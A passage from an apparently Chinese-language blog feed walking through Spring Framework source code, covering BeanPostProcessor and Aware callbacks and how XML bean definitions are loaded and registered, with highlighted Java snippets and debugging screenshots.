class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">applyBeanPostProcessorsBeforeInitialization</span><span class="token punctuation">(</span><span class="token class-name">Object</span> existingBean<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span>      <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">Object</span> result <span class="token operator">=</span> existingBean<span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">BeanPostProcessor</span> processor <span class="token operator">:</span> <span class="token function">getBeanPostProcessors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">Object</span> current <span class="token operator">=</span> processor<span class="token punctuation">.</span><span class="token function">postProcessBeforeInitialization</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>current <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> result<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      result <span class="token operator">=</span> current<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>而applyBeanPostProcessorsAfterInitialization 会将所有的 BeanPostProcessor 拿取出来进行执行</p><h3 id="ApplicationContextAwareProcessor-postProcessBeforeInitialization-继而invokeAwareInterfaces"><a href="#ApplicationContextAwareProcessor-postProcessBeforeInitialization-继而invokeAwareInterfaces" class="headerlink" title="ApplicationContextAwareProcessor .postProcessBeforeInitialization 继而invokeAwareInterfaces"></a>ApplicationContextAwareProcessor .postProcessBeforeInitialization 继而invokeAwareInterfaces</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token annotation punctuation">@Nullable</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">postProcessBeforeInitialization</span><span class="token punctuation">(</span><span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">EnvironmentAware</span> <span class="token operator">||</span> bean <span class="token keyword">instanceof</span> <span class="token class-name">EmbeddedValueResolverAware</span> <span class="token operator">||</span>         bean <span class="token keyword">instanceof</span> <span class="token class-name">ResourceLoaderAware</span> <span class="token operator">||</span> bean <span class="token keyword">instanceof</span> <span class="token class-name">ApplicationEventPublisherAware</span> <span class="token operator">||</span>         bean <span class="token keyword">instanceof</span> <span class="token class-name">MessageSourceAware</span> <span class="token operator">||</span> bean <span class="token keyword">instanceof</span> <span class="token class-name">ApplicationContextAware</span> <span class="token operator">||</span>         bean <span class="token keyword">instanceof</span> <span class="token class-name">ApplicationStartupAware</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> bean<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token class-name">AccessControlContext</span> acc <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      acc <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>applicationContext<span class="token punctuation">.</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAccessControlContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>acc <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">AccessController</span><span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">PrivilegedAction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>         <span class="token function">invokeAwareInterfaces</span><span class="token punctuation">(</span>bean<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> acc<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token function">invokeAwareInterfaces</span><span class="token punctuation">(</span>bean<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> bean<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">invokeAwareInterfaces</span><span class="token punctuation">(</span><span class="token class-name">Object</span> bean<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">EnvironmentAware</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">EnvironmentAware</span><span class="token punctuation">)</span> bean<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setEnvironment</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>applicationContext<span class="token punctuation">.</span><span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">EmbeddedValueResolverAware</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">EmbeddedValueResolverAware</span><span class="token punctuation">)</span> bean<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setEmbeddedValueResolver</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>embeddedValueResolver<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">ResourceLoaderAware</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ResourceLoaderAware</span><span class="token punctuation">)</span> bean<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setResourceLoader</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">ApplicationEventPublisherAware</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ApplicationEventPublisherAware</span><span class="token punctuation">)</span> bean<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setApplicationEventPublisher</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">MessageSourceAware</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">MessageSourceAware</span><span class="token punctuation">)</span> bean<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMessageSource</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">ApplicationStartupAware</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ApplicationStartupAware</span><span class="token punctuation">)</span> bean<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setApplicationStartup</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>applicationContext<span class="token punctuation">.</span><span class="token function">getApplicationStartup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">ApplicationContextAware</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ApplicationContextAware</span><span class="token punctuation">)</span> bean<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setApplicationContext</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>至此，这里执行的arare 这个BeanPostProcessor的接口回调。</p><p>整体流程下来，也就是为什么我们Bean实现 了xxxAware,就能给我们的组件注入相关对象。</p><p>后续章节会细细讲解</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220424223748792.png" alt="image-20220424223748792"></p><h2 id="整体的流程图"><a href="#整体的流程图" class="headerlink" title="整体的流程图"></a>整体的流程图</h2><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3Bean%E5%88%9B%E5%BB%BA%E8%BF%87%E7%A8%8B.drawio.png" alt="简单了解Bean创建过程.drawio"></p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>这里我们了解了Aware 的实现方式，同时也引出了一个新的概念 BeanPostProcessor</p><p>Bean的功能增强全部都是BeanPostProcessor+InitializingBean  这两个特性来实现的，包括AOP、事务、通知、WEB等功能基本上全是这样来搞出来的，后续章节会一一揭开它们的面纱</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Spring源码</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BeanPostProcessor</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指源码-spring(二)-BeanDefinitionRegistry将定义信息放入档案馆</title>
    <link href="/posts/9186b1c0.html"/>
    <url>/posts/9186b1c0.html</url>
    
    <content type="html"><![CDATA[<p> 概述将文件解析成BeanDefinition信息之前流程，</p><span id="more"></span><h1 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h1><h2 id="debug代码流程"><a href="#debug代码流程" class="headerlink" title="debug代码流程"></a>debug代码流程</h2><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MainTest</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">ClassPathXmlApplicationContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"bean.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">Person</span> bean <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>bean<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>debug上述代码，断点位置</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220423214653923.png" alt="image-20220423214653923"></p><p>debug 堆栈分析</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220423214824604.png" alt="image-20220423214824604"></p><h2 id="核心堆栈代码分析"><a href="#核心堆栈代码分析" class="headerlink" title="核心堆栈代码分析"></a>核心堆栈代码分析</h2><h3 id="ClassPathXmlApplicationContext-refresh"><a href="#ClassPathXmlApplicationContext-refresh" class="headerlink" title="ClassPathXmlApplicationContext refresh()"></a>ClassPathXmlApplicationContext refresh()</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> configLocations<span class="token punctuation">,</span> <span class="token keyword">boolean</span> refresh<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> <span class="token class-name">ApplicationContext</span> parent<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span><span class="token keyword">super</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setConfigLocations</span><span class="token punctuation">(</span>configLocations<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>refresh<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//刷新容器对象</span><span class="token function">refresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="AbstractRefreshableApplicationContext-refreshBeanFactory（）"><a href="#AbstractRefreshableApplicationContext-refreshBeanFactory（）" class="headerlink" title="AbstractRefreshableApplicationContext  refreshBeanFactory（）"></a>AbstractRefreshableApplicationContext  refreshBeanFactory（）</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">refreshBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hasBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">destroyBeans</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">closeBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// 创建档案馆bean工厂，并初始化设置一直自定义属性</span>      <span class="token class-name">DefaultListableBeanFactory</span> beanFactory <span class="token operator">=</span> <span class="token function">createBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      beanFactory<span class="token punctuation">.</span><span class="token function">setSerializationId</span><span class="token punctuation">(</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">customizeBeanFactory</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>beanFactory <span class="token operator">=</span> beanFactory<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationContextException</span><span class="token punctuation">(</span><span class="token string">"I/O error parsing bean definition source for "</span> <span class="token operator">+</span> <span class="token function">getDisplayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="AbstractXmlApplicationContext-loadBeanDefinitions"><a href="#AbstractXmlApplicationContext-loadBeanDefinitions" class="headerlink" title="AbstractXmlApplicationContext   loadBeanDefinitions()"></a>AbstractXmlApplicationContext   loadBeanDefinitions()</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span><span class="token class-name">DefaultListableBeanFactory</span> beanFactory<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// Create a new XmlBeanDefinitionReader for the given BeanFactory.</span>   <span class="token comment">// 准备一个xml内容读取器</span>   <span class="token class-name">XmlBeanDefinitionReader</span> beanDefinitionReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XmlBeanDefinitionReader</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Configure the bean definition reader with this context's</span>   <span class="token comment">// resource loading environment.</span>   beanDefinitionReader<span class="token punctuation">.</span><span class="token function">setEnvironment</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 组合资源加载器</span>   beanDefinitionReader<span class="token punctuation">.</span><span class="token function">setResourceLoader</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   beanDefinitionReader<span class="token punctuation">.</span><span class="token function">setEntityResolver</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ResourceEntityResolver</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Allow a subclass to provide custom initialization of the reader,</span>   <span class="token comment">// then proceed with actually loading the bean definitions.</span>   <span class="token function">initBeanDefinitionReader</span><span class="token punctuation">(</span>beanDefinitionReader<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>beanDefinitionReader<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这里组合了一个资源加载器，也就是    <strong>beanDefinitionReader.setResourceLoader(this);</strong> 将自身赋予内容读取器，后续由该内容读取器去读取内容</p><h3 id="AbstractXmlApplicationContext-loadBeanDefinitions（）"><a href="#AbstractXmlApplicationContext-loadBeanDefinitions（）" class="headerlink" title="AbstractXmlApplicationContext    loadBeanDefinitions（）"></a>AbstractXmlApplicationContext    loadBeanDefinitions（）</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span><span class="token class-name">XmlBeanDefinitionReader</span> reader<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">Resource</span><span class="token punctuation">[</span><span class="token punctuation">]</span> configResources <span class="token operator">=</span> <span class="token function">getConfigResources</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>configResources <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      reader<span class="token punctuation">.</span><span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>configResources<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// 这里数组可以 一次性传入多个配置文件</span>   <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> configLocations <span class="token operator">=</span> <span class="token function">getConfigLocations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>configLocations <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// 资源读取器 开始读取</span>      reader<span class="token punctuation">.</span><span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>configLocations<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="AbstractBeanDefinitionReader-loadBeanDefinitions"><a href="#AbstractBeanDefinitionReader-loadBeanDefinitions" class="headerlink" title="AbstractBeanDefinitionReader  loadBeanDefinitions()"></a>AbstractBeanDefinitionReader  loadBeanDefinitions()</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> locations<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeanDefinitionStoreException</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">notNull</span><span class="token punctuation">(</span>locations<span class="token punctuation">,</span> <span class="token string">"Location array must not be null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment">//循环加载每一个配置文件的内容</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> location <span class="token operator">:</span> locations<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      count <span class="token operator">+=</span> <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="XmlBeanDefinitionReader-doLoadBeanDefinitions"><a href="#XmlBeanDefinitionReader-doLoadBeanDefinitions" class="headerlink" title="XmlBeanDefinitionReader doLoadBeanDefinitions"></a>XmlBeanDefinitionReader doLoadBeanDefinitions</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">int</span> <span class="token function">doLoadBeanDefinitions</span><span class="token punctuation">(</span><span class="token class-name">InputSource</span> inputSource<span class="token punctuation">,</span> <span class="token class-name">Resource</span> resource<span class="token punctuation">)</span>      <span class="token keyword">throws</span> <span class="token class-name">BeanDefinitionStoreException</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">Document</span> doc <span class="token operator">=</span> <span class="token function">doLoadDocument</span><span class="token punctuation">(</span>inputSource<span class="token punctuation">,</span> resource<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 使用xml 解析工具将xml 变成Document</span>      <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token function">registerBeanDefinitions</span><span class="token punctuation">(</span>doc<span class="token punctuation">,</span> resource<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Loaded "</span> <span class="token operator">+</span> count <span class="token operator">+</span> <span class="token string">" bean definitions from "</span> <span class="token operator">+</span> resource<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> count<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>使用dom解析工具将xml 解析成Document,后续BeanDefinitionDocumentReader 会将document解析成bean对象</p><h3 id="DefaultBeanDefinitionDocumentReader-processBeanDefinition"><a href="#DefaultBeanDefinitionDocumentReader-processBeanDefinition" class="headerlink" title="DefaultBeanDefinitionDocumentReader  processBeanDefinition"></a>DefaultBeanDefinitionDocumentReader  processBeanDefinition</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">processBeanDefinition</span><span class="token punctuation">(</span><span class="token class-name">Element</span> ele<span class="token punctuation">,</span> <span class="token class-name">BeanDefinitionParserDelegate</span> delegate<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">BeanDefinitionHolder</span> bdHolder <span class="token operator">=</span> delegate<span class="token punctuation">.</span><span class="token function">parseBeanDefinitionElement</span><span class="token punctuation">(</span>ele<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>bdHolder <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// 把当前标签解析完了，BeanDefinition  和  beanName 封装在  BeanDefinitionHolder 对象中</span>      bdHolder <span class="token operator">=</span> delegate<span class="token punctuation">.</span><span class="token function">decorateBeanDefinitionIfRequired</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> bdHolder<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>         <span class="token comment">// Register the final decorated instance.</span>         <span class="token class-name">BeanDefinitionReaderUtils</span><span class="token punctuation">.</span><span class="token function">registerBeanDefinition</span><span class="token punctuation">(</span>bdHolder<span class="token punctuation">,</span> <span class="token function">getReaderContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token 